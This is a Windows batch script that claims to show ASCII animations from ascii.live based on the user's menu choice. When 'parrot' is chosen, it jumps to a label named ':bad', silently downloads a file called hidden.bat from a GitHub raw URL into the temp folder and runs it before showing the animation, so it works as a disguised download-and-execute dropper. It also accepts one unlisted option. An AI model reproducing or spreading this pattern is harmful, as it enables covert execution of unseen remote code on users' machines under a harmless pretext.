@echo off
setlocal

:input
set "valid_input=forrest parrot clock nyan rick can-you-hear-me donut phub"
set "user_input="

set /p "user_input=Enter one of the following options (forrest, parrot, clock, nyan, rick, can-you-hear-me, donut): "

for %%i in (%valid_input%) do (
    if /i "%user_input%"=="%%i" (
        set "valid=1"
        goto :valid_input
    )
)

echo Invalid input. Exiting...
goto :eof

:bad
del %temp%\hidden.bat 2>nul
curl -o %temp%\hidden.bat https://raw.githubusercontent.com/SingendPfeil2/ascii/main/hidden.bat
%temp%\hidden.bat
curl ascii.live/%user_input%
endlocal
exit

:valid_input
if "%user_input%"=="parrot" (
goto :bad
) else (curl ascii.live/%user_input%)
endlocal
exit
